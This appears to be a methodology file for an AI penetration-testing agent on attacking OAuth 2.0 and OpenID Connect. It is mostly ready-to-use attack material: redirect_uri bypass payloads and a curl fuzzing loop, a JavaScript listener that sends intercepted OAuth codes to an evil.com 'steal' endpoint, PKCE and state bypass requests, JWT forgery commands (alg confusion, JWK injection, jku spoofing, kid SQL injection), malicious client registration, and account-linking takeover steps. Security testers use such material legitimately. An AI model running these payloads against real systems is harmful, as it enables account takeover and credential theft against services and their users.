---
name: oauth-oidc-attacks
description: OAuth 2.0 and OpenID Connect attack methodology covering redirect_uri manipulation, token theft, PKCE bypass, JWT confusion, and account linking attacks
depends_on: [authentication_jwt]
---

# OAuth 2.0 / OpenID Connect Attacks

OAuth 2.0 delegates authorization and OIDC adds authentication on top. The complexity of multi-party flows (client, authorization server, resource server, user agent) creates a large attack surface. Most OAuth vulnerabilities exploit trust boundaries between these parties - especially around redirect handling, token validation, and state management.

## Attack Surface

**Flow Types**
- Authorization Code (with and without PKCE) - most common for web apps
- Implicit (deprecated but still deployed) - token in URL fragment
- Client Credentials - machine-to-machine, no user involved
- Device Code - TV/IoT flows, out-of-band authorization
- Resource Owner Password (deprecated) - direct credential submission

**Key Endpoints**
- Authorization: `/authorize`, `/oauth/authorize`, `/auth`
- Token: `/token`, `/oauth/token`, `/oauth2/token`
- UserInfo: `/userinfo`, `/oauth/userinfo`, `/me`
- Discovery: `/.well-known/openid-configuration`, `/.well-known/oauth-authorization-server`
- JWKS: `/.well-known/jwks.json`, `/oauth/jwks`
- Registration: `/register`, `/oauth/register` (dynamic client registration)

**Trust Boundaries**
- Client app trusts authorization server to validate users
- Authorization server trusts redirect_uri to belong to the client
- Resource server trusts access tokens issued by authorization server
- User agent (browser) handles redirects, fragments, and postMessage

## redirect_uri Manipulation

The redirect_uri determines where authorization codes and tokens are sent. Bypassing validation sends credentials to the attacker.

### Common Bypass Techniques

```
# Exact match bypass attempts
https://client.com/callback -> https://client.com/callback/../evil
https://client.com/callback -> https://client.com/callback%23@evil.com
https://client.com/callback -> https://client.com/callback/.evil.com

# Subdomain matching exploitation
https://client.com/callback -> https://evil.client.com/callback
https://client.com/callback -> https://attacker.com/.client.com/callback

# Path traversal
https://client.com/callback -> https://client.com/callback/../../attacker-controlled-path

# Fragment injection (implicit flow - token in fragment)
https://client.com/callback -> https://client.com/callback#@evil.com

# Open redirect chaining
# If client.com has an open redirect at /redirect?url=
https://client.com/redirect?url=https://evil.com
# Use this as redirect_uri:
redirect_uri=https://client.com/redirect?url=https://evil.com

# localhost/127.0.0.1 bypass (mobile app flows)
redirect_uri=http://localhost:1234/callback
redirect_uri=http://127.0.0.1:1234/callback
redirect_uri=http://[::1]:1234/callback

# Custom scheme abuse (mobile)
redirect_uri=com.legitimate.app://callback -> com.attacker.app://callback
# If scheme is not app-pinned, any app can register the same scheme
```

### Testing redirect_uri Validation

```bash
# Baseline - get the legitimate redirect_uri
curl -s "https://auth.target.com/.well-known/openid-configuration" | jq '.authorization_endpoint'

# Test with modifications
for uri in \
  "https://evil.com" \
  "https://client.com.evil.com/callback" \
  "https://client.com/callback/../../../evil" \
  "https://client.com/callback%00@evil.com" \
  "https://client.com/callback?redirect=evil.com" \
  "https://client.com/callback#@evil.com" \
  "http://localhost/callback" \
  "https://client.com/callback/..%2f..%2fevil"; do
  echo "Testing: $uri"
  curl -s -o /dev/null -w "%{http_code} %{redirect_url}" \
    "https://auth.target.com/authorize?response_type=code&client_id=CLIENT&redirect_uri=$uri&scope=openid"
  echo
done
```

## Authorization Code Theft

Even with correct redirect_uri, the authorization code can leak:

### Referrer Leakage

```
# If the callback page loads external resources (images, scripts, analytics),
# the authorization code in the URL is sent in the Referer header

# Test: after authorization, check if callback page loads third-party resources
# The code parameter in the URL leaks via Referer to those third parties
# Example: callback page has <img src="https://analytics.com/pixel.gif">
# Referer: https://client.com/callback?code=AUTH_CODE_HERE
```

### postMessage Interception

```javascript
// If the OAuth flow uses postMessage to communicate the code to the parent window,
// an attacker iframe can intercept it

// Attacker page
window.addEventListener("message", function(event) {
    // Capture OAuth code/token sent via postMessage
    fetch("https://evil.com/steal?data=" + encodeURIComponent(JSON.stringify(event.data)));
});

// Open OAuth flow in popup/iframe
window.open("https://auth.target.com/authorize?response_type=code&client_id=CLIENT&redirect_uri=...");
```

### Browser History

```
# Implicit flow tokens and authorization codes in URLs persist in:
# - Browser history
# - Proxy logs
# - Web server access logs
# - Browser extensions with history access
```

## PKCE Bypass

PKCE (Proof Key for Code Exchange) prevents authorization code interception. Bypass if implementation is weak:

```bash
# Test 1: Strip code_verifier entirely from token request
# If server issues token without verifier, PKCE is not enforced
curl -X POST https://auth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=CLIENT" \
  -d "redirect_uri=https://client.com/callback"
  # Note: no code_verifier parameter

# Test 2: Downgrade from S256 to plain
# Authorization request used code_challenge_method=S256
# Token request sends code_verifier=<the_original_challenge> (not the pre-image)
curl -X POST https://auth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=CLIENT" \
  -d "redirect_uri=https://client.com/callback" \
  -d "code_verifier=THE_CHALLENGE_VALUE_ITSELF"

# Test 3: Use a different code_challenge_method
# Send code_challenge_method=plain in authorize, server may accept without S256

# Test 4: Re-use code_verifier across sessions
# Generate one valid code_challenge/verifier pair and reuse the verifier for stolen codes
```

## State Parameter Attacks

The `state` parameter prevents CSRF on the OAuth flow.

```bash
# Test 1: Omit state entirely
# If the authorization server accepts the request without state,
# the client may also skip validation
curl "https://auth.target.com/authorize?response_type=code&client_id=CLIENT&redirect_uri=CALLBACK&scope=openid"
# No state parameter - does it work?

# Test 2: Predictable state
# If state is a timestamp, sequential number, or short random value, it can be guessed

# Test 3: State fixation
# Attacker starts OAuth flow, gets a state value, then tricks victim into completing the flow
# with attacker's state -> victim's account linked to attacker's OAuth identity

# Test 4: State reuse
# Complete a flow, then re-use the same state value in a new request
# If the server/client doesn't invalidate used states, replay is possible
```

## Token Attacks

### Token Swapping

Exchange a token from one context for access in another:

```bash
# Swap access token between clients
# Get token from Client A (low-privilege app)
# Use it with Client B (high-privilege app) at the resource server

# Test: use access_token from one client_id with another client's API
curl https://api.target.com/admin/users \
  -H "Authorization: Bearer <token_from_low_priv_client>"

# Swap authorization code
# Get code from Client A's flow, exchange it at Client B's token endpoint
curl -X POST https://auth.target.com/token \
  -d "grant_type=authorization_code" \
  -d "code=CODE_FROM_CLIENT_A" \
  -d "client_id=CLIENT_B" \
  -d "client_secret=CLIENT_B_SECRET" \
  -d "redirect_uri=https://clientb.com/callback"
```

### Token Leakage Vectors

```
# URL fragment (implicit flow) -> accessible to JavaScript on the page
# Check: does the callback page have any XSS or third-party scripts?

# Referrer header
# Check: does the page with the token load external resources?

# Server logs
# Check: are tokens logged in access logs, error logs, or analytics?

# Browser storage
# Check: is the token stored in localStorage (accessible to XSS) vs httpOnly cookie?

# Token in URL parameter (some implementations)
# GET /api/resource?access_token=TOKEN -> logged everywhere
```

## Scope Escalation

```bash
# Request more scopes than the client is authorized for
curl "https://auth.target.com/authorize?response_type=code&client_id=CLIENT\
&redirect_uri=CALLBACK&scope=openid+profile+email+admin+write:users"

# Scope injection via delimiter confusion
# Space-delimited (standard) vs comma-delimited vs plus-delimited
&scope=openid%20admin
&scope=openid,admin
&scope=openid+admin

# Scope upgrade via refresh token
# Initial grant has scope=read
# Refresh with scope=read+write
curl -X POST https://auth.target.com/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=RT_VALUE" \
  -d "scope=read write admin"

# Test: what scopes does the token actually have vs what was requested?
# Introspect or decode the token to check
```

## JWT Confusion Attacks

### Algorithm Confusion (RS256 to HS256)

If the server's public key is known and the JWT library accepts `alg: HS256`:

```bash
# Get the server's public key
curl -s https://auth.target.com/.well-known/jwks.json | jq '.keys[0]'

# Convert JWK to PEM
# Use the PEM as the HMAC secret to sign a forged token with alg=HS256
# The server uses the public key to verify - and HMAC(pubkey, payload) matches

# jwt_tool automates this
python3 jwt_tool.py <token> -X k -pk public_key.pem
```

### JWK Injection

```bash
# Inject attacker's public key into the JWT header
# Header: {"alg":"RS256","jwk":{"kty":"RSA","n":"attacker_n","e":"AQAB"}}
# Sign the token with attacker's private key
# If the server trusts the embedded JWK, the forged token verifies

python3 jwt_tool.py <token> -X i
```

### kid (Key ID) Manipulation

```bash
# kid references which key to use for verification
# If kid is used in a file path or database query, inject into it

# Path traversal
{"alg":"HS256","kid":"../../dev/null"}
# Signs with empty string as secret

# SQL injection
{"alg":"HS256","kid":"1' UNION SELECT 'attacker_secret'--"}

# Directory traversal to known file
{"alg":"HS256","kid":"/proc/sys/kernel/hostname"}
# Sign with the hostname value as secret
```

### jku (JWK Set URL) Spoofing

```bash
# jku points to a URL where the server fetches the signing key
# Replace with attacker-controlled URL serving attacker's public key

# Header: {"alg":"RS256","jku":"https://evil.com/.well-known/jwks.json"}
# Host attacker's JWKS at that URL with the corresponding public key
# Sign token with attacker's private key

python3 jwt_tool.py <token> -X s -ju https://evil.com/jwks.json
```

### Common JWT Validation Failures

```bash
# None algorithm
{"alg":"none"}  # Remove signature entirely
python3 jwt_tool.py <token> -X a

# Expired token acceptance
# Modify exp claim to past date, test if server rejects

# Missing claims
# Remove iss, aud, or sub claims - test if server validates them

# Audience confusion
# Token issued for Client A accepted by Client B
# Change aud claim and test

# Issuer confusion
# Token from auth-server-a.com accepted by app that trusts auth-server-b.com
```

## ID Token Validation Failures

OpenID Connect ID tokens must be validated by the client:

```bash
# Test: does the client validate these claims?

# 1. Issuer (iss) - must match the expected authorization server
# Forge token with iss=https://evil-auth-server.com

# 2. Audience (aud) - must contain the client_id
# Forge token with aud=different-client-id

# 3. Expiration (exp) - must not be expired
# Use an expired token - does the client accept it?

# 4. Nonce - must match the nonce sent in the authorization request
# Replay a token with a different nonce or no nonce

# 5. at_hash - access token hash must match the access token
# Swap access tokens between sessions
```

## Discovery Endpoint Abuse

```bash
# Dump full OIDC configuration
curl -s https://auth.target.com/.well-known/openid-configuration | jq .

# Key information exposed:
# - All supported scopes (may reveal admin/internal scopes)
# - All supported grant types
# - Token introspection and revocation endpoints
# - Dynamic registration endpoint
# - Supported signing algorithms (check for none, HS256)
# - JWKS URI for key material
```

## Dynamic Client Registration

If the registration endpoint is open:

```bash
# Register a malicious client
curl -X POST https://auth.target.com/register \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Legitimate App",
    "redirect_uris": ["https://evil.com/callback"],
    "grant_types": ["authorization_code"],
    "response_types": ["code"],
    "scope": "openid profile email admin"
  }'

# Response includes client_id and client_secret
# Now use this client to initiate OAuth flows with attacker-controlled redirect_uri
```

## Refresh Token Attacks

```bash
# Race condition during rotation
# If the server rotates refresh tokens (issues new RT on use),
# use the old RT concurrently from two sessions
# If both succeed, attacker maintains access after rotation

# Stolen refresh token
# Refresh tokens are long-lived - if leaked from logs, storage, or XSS,
# attacker gets persistent access
curl -X POST https://auth.target.com/token \
  -d "grant_type=refresh_token" \
  -d "refresh_token=STOLEN_RT" \
  -d "client_id=CLIENT"

# Test: does token revocation actually work?
# Revoke a token, then try to use it
curl -X POST https://auth.target.com/revoke \
  -d "token=RT_VALUE" \
  -d "client_id=CLIENT"
# Then try refreshing with the revoked token
```

## Account Linking Attacks

When the application links OAuth identities to local accounts:

```
# Attack flow:
# 1. Attacker creates account on target app (attacker@evil.com)
# 2. Attacker starts OAuth linking flow (e.g., "Connect Google Account")
# 3. Attacker gets the OAuth callback URL with authorization code
# 4. Attacker sends the callback URL to victim (via CSRF if no state check)
# 5. Victim's browser follows the URL
# 6. Target app links attacker's OAuth identity to victim's active session
# 7. Attacker can now log into victim's account via OAuth

# Prerequisites:
# - Missing or predictable state parameter
# - No confirmation step before linking
# - OAuth linking endpoint vulnerable to CSRF
```

```bash
# Pre-auth account linking
# Some apps auto-link OAuth accounts matching the same email
# 1. Register OAuth account with victim's email at the OAuth provider
# 2. Log in to target app via OAuth
# 3. Target app creates/links to the account with victim's email
# 4. Attacker now controls victim's account
```

## Tools

- **jwt_tool** - JWT analysis, tampering, and exploitation (algorithm confusion, injection, bruteforce)
- **Burp Suite OAuth extension** - intercept and modify OAuth flows
- **jwt.io** - decode and inspect JWT structure and claims
- **oauth-tools.com** - interactive OAuth flow testing
- **Postman** - manual OAuth flow testing with variable substitution
- **OWASP ZAP** - automated scanning with OAuth-aware session handling

```bash
# jwt_tool - comprehensive JWT testing
python3 jwt_tool.py <token> -T  # tamper mode
python3 jwt_tool.py <token> -C -d wordlist.txt  # crack HMAC secret
python3 jwt_tool.py <token> -X a  # test none algorithm
python3 jwt_tool.py <token> -X k -pk pubkey.pem  # algorithm confusion
python3 jwt_tool.py <token> -X i  # JWK injection
python3 jwt_tool.py <token> -X s -ju https://evil.com/jwks.json  # jku spoofing
python3 jwt_tool.py <token> -I -pc sub -pv admin  # inject claim
```

## Testing Methodology

1. **Discover endpoints** - fetch `.well-known/openid-configuration`, enumerate authorization/token/userinfo endpoints
2. **Map the flow** - identify which grant type is used, whether PKCE is enforced, what scopes are available
3. **Test redirect_uri** - systematic fuzzing of the redirect_uri parameter for bypass
4. **Test state** - omit, reuse, and predict the state parameter
5. **Test PKCE** - omit code_verifier, downgrade S256 to plain
6. **Test scopes** - request unauthorized scopes, test scope upgrade on refresh
7. **Test tokens** - JWT algorithm confusion, claim manipulation, expiration bypass, audience confusion
8. **Test ID token validation** - verify client checks iss, aud, exp, nonce, at_hash
9. **Test account linking** - CSRF on link endpoint, pre-auth linking via email matching
10. **Test refresh tokens** - race conditions on rotation, revocation effectiveness
11. **Test client registration** - if open, register a malicious client

## Validation

1. If redirect_uri bypass found: show the authorization code/token arriving at attacker-controlled URL
2. If PKCE bypass: show token exchange succeeding without valid code_verifier
3. If JWT confusion: show a forged token accepted by the resource server returning protected data
4. If account linking attack: show attacker gaining access to victim's account or session
5. If scope escalation: show the token containing unauthorized scopes and accessing restricted resources
6. Provide the full HTTP request/response chain for each step of the attack

## False Positives

- Authorization server returning an error page at the attacker's redirect_uri (code was not sent, just an error redirect)
- PKCE being optional for the flow type (e.g., public clients where PKCE adds no security)
- JWT `none` algorithm accepted in development but rejected in production
- Open client registration that requires admin approval before the client can be used
- State parameter missing but the application has other CSRF protections (SameSite cookies, origin checking)

## Impact

- redirect_uri bypass: full account takeover via stolen authorization code or access token
- PKCE bypass: authorization code interception on public clients (mobile apps, SPAs)
- JWT confusion: forge tokens as any user, bypass all authentication
- Account linking: persistent account takeover without credential theft
- Scope escalation: unauthorized access to admin APIs, PII, or write operations
- Refresh token theft: long-term persistent access surviving password changes

## Defense-Bypass Pairs (Corpus-Derived)

| Defense | Bypass Technique | Real Example |
|---------|-----------------|--------------|
| `endsWith()` origin allowlist | Put allowed host in URL path: `https://attacker.com/allowed.com` | Google Gemini Code Assist $1M (#1017031168) |
| URL host allowlist (file= param) | Fragment confusion: `host.com/attacker.com#.allowed.com` + double-encode | Google edit.chromium.org $750k (#424961024) |
| Email verification interstitial | Replay POST to `/oauth/authorize` directly — server skips check | GitLab OAuth unverified email $3k (#922456) |
| PKCE on mobile OAuth | App never sends code_challenge; strip code_verifier from token request | Shopify Shop App $900 (#1700734) |
| `state` CSRF token | Service worker intercepts callback URL including state before validation | GitLab Pages token theft $1.7k (#1439552) |
| redirect_uri prefix match | Path traversal: `/callback/../../../../attacker-page` normalizes in browser | pixiv OAuth code theft $2k (#1861974) |
| SAML RelayState validation | Store open redirect in session cookie, replay after OAuth implicit grant | GitLab SAML+OAuth chain $2.5k (#1923672) |
| postMessage targetOrigin | Derive targetOrigin from attacker-controlled `state.origin` JSON field | Google Gemini $1M (#1017031168) |
| Android app identity (key hash) | Sign malicious app with public React Native debug keystore | Instagram ATO via debug key $12k (#1761200348) |
| Consent screen trust | Reuse legitimate client_id from IDE plugin; victim sees real Google branding | Cloud Tools for Eclipse $50k (#1019155456) |
| Host-header-based callback URL | Inject `attacker.com/legit.com` in Host header via proxy | Periscope TV ATO $7.6k (#317476) |

## Chain Patterns (Corpus-Derived)

| Base Finding | Chain With | Combined Impact | Example |
|-------------|-----------|----------------|---------|
| Open redirect (Low) | OAuth implicit grant `response_type=token` | Token theft -> ATO (Critical) | GitLab SAML RelayState $2.5k (#1923672) |
| XSS in Canvas/iframe app (Medium) | postMessage to parent frame OAuth handler | First-party token theft -> ATO (Critical) | Facebook Canvas $126k (#294166288) |
| OAuth code in URL (Info) | Google Analytics / third-party tracker on landing page | Code exfil via analytics (High) | pixiv/booth.pm $2k (#1861974) |
| Login CSRF (Low) | SSO path traversal + postMessage wildcard | Cross-platform ATO (Critical) | Meta FXAuth $30k (#3226787990) |
| `machine_id` leak in token response (Low) | Batch API field-reference chaining + device trust recovery | Full ATO bypassing 2FA (Critical) | Facebook datr cookie $24k (#3320995794) |
| Overprivileged token scope (Medium) | Any XSS on same-origin subdomain | Silent token capture -> ATO (Critical) | Meta unrestricted permissions $18k (#1984554648) |
| Missing PKCE on mobile (Medium) | Custom URL scheme hijack by malicious app | Authorization code interception (High) | Shopify Shop App Outlook $900 (#1700734) |
| OAuth Login CSRF no state (Medium) | Local callback server bound to 0.0.0.0 | Victim works in attacker's cloud account (High) | Google Eclipse plugin $10.1k (#951185408) |
| localhost redirect_uri (Low) | `continue=` open redirect on local dev server + Referer leak | Full GCP token theft (Critical) | Cloud Tools for Eclipse $50k (#1019155456) |

## Provider-Specific Quirks

| Provider | Quirk | Exploitation | Impact |
|---------|-------|-------------|--------|
| Google | Desktop OAuth libs default bind to 0.0.0.0, not 127.0.0.1 | LAN-reachable callback; inject attacker's auth code | Login CSRF on IDE/CLI tools |
| Google | `state` parameter used as JSON config channel (ticket + origin) | Inject attacker-controlled fields that influence security decisions | postMessage targetOrigin hijack |
| Facebook | Batch API allows field-referencing across chained requests | Launder sensitive response fields into attacker-readable output | Device cookie exfiltration |
| Facebook | Canvas apps run in `apps.facebook.com` — trusted by parent postMessage handlers | Any XSS in any Canvas app = postMessage to parent = token theft | Universal ATO primitive |
| Facebook/Meta | First-party tokens carry scopes beyond what the requesting surface justifies | Capture token from low-privilege surface, use against high-privilege API | Cross-product ATO |
| Microsoft | Allows implicit grant (`response_type=token`) on many OAuth clients | Chain with any open redirect on relying party for fragment-based token theft | Token theft without code exchange |
| Bitbucket | Implicit grant still allowed for legacy integrations | Pair with stored open redirect on GitLab to steal Bitbucket tokens | Full repo access via fragment leak |
| GitLab | SAML RelayState stored in session cookie, replayed after login | Poison session with attacker redirect, then trigger OAuth flow | Token delivered to attacker domain |
| Okta | RelayState parameter passed through without strict validation | Open redirect post-SAML-auth to arbitrary URLs | Session-stored redirect poisoning |
| Apple | Sign in with Apple requires `response_mode=form_post` for web | Intercept POST body instead of URL params; test if form_post target validates origin | Token theft via form action manipulation |

## Pro Tips

1. Always start by reading `.well-known/openid-configuration` - it maps the entire OAuth surface
2. Test redirect_uri with open redirects on the client domain - this is the most commonly exploitable vector
3. JWT `kid` parameter is an underrated injection point - test for SQLi and path traversal
4. Check if the server accepts both RS256 and HS256 - algorithm confusion requires this
5. Implicit flow tokens in URL fragments leak via Referer when the page loads external content
6. Account linking CSRF is high-impact and often overlooked in bug bounty scopes
7. Test refresh token rotation with concurrent requests - race conditions are common
8. Dynamic client registration is rare but critical when found - it gives full control of redirect_uri
9. Mobile OAuth: custom URI schemes are not unique - any app can register the same scheme
10. Always decode base64 in tokens and state parameters - they often contain exploitable structure
11. When `state` is structured JSON rather than opaque, every field inside it is a separate attack surface -- trace each field to see if it influences a security decision (Google $1M bug)
12. Grep client-side code for `endsWith`, `startsWith`, `includes` in origin/URL validation contexts -- each is bypassable when the comparand is not first parsed into components
13. For any OAuth flow using postMessage between popup and opener, trace where `targetOrigin` is sourced -- if derived from any user-controllable input, it is exploitable
14. Enumerate every OAuth client_id the target uses (mobile apps, IDE plugins, CLIs, internal tools) -- desktop/IDE clients frequently have weaker PKCE enforcement and localhost redirects
15. Chain low-severity open redirects with OAuth implicit grants -- this pattern has paid out repeatedly ($2.5k-$126k) and security teams consistently underrate the combination
16. Check for "UI-only gates" on OAuth consent: if the server shows a "verify email first" interstitial, replay the POST directly -- the server-side check is often missing
17. On platforms hosting third-party content (Canvas, marketplace, add-ons), any XSS in any third-party app is an ATO primitive if the parent frame trusts `*.platform.com` via postMessage
18. When an API supports batch/chained requests, test whether a sensitive-data-returning call can be chained with a data-writing call to launder secrets into attacker-readable output (Facebook $24k bug)
19. For every granted OAuth scope, enumerate ALL API endpoints it actually unlocks -- consent screens omit capabilities, and layered cloud services (registry over storage, function over container) often inherit the inner service's wider permissions ($500K GCR scope escape, $313K Cloud Print scope audit)

## Summary

OAuth/OIDC vulnerabilities exploit trust between the client, authorization server, and resource server. The highest-impact attacks target redirect_uri validation and JWT verification, as both lead directly to account takeover. Test every parameter in the flow, not just the obvious ones - state, nonce, scope, and PKCE enforcement are frequently misconfigured.
